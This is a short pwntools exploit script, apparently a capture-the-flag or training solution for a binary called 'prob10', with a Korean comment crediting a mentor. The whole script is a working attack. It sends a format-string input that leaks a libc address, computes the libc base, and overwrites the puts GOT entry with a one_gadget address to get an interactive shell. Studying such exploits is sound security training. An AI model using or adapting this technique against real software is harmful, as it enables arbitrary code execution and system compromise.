from pwn import *

#p = remote('fsi.zzado.kr', 9940)
p = process('./prob10')
e = ELF('./prob10')
lib = ELF('./libc.so.6')

puts_got = e.got['puts']

context.bits = 64

p.recv()
p.send(b'%p %p %p %p %p')

dl_fini = p.recv().split(b' ')
dl_fini = int(dl_fini[4][:-3], 16)
log.info(f'dl_fini : {hex(dl_fini)}')

libc_base = dl_fini - 0x237040 #멘토님께서 구한 차이값으로 계산

one_gadget = libc_base + 0xebc81
log.info(f'libc_base : {hex(libc_base)}')
log.info(f'one_gadget : {hex(one_gadget)}')

Writes = {puts_got: one_gadget}

payload = b''
payload += fmtstr_payload(6, Writes)

p.send(payload)

p.interactive()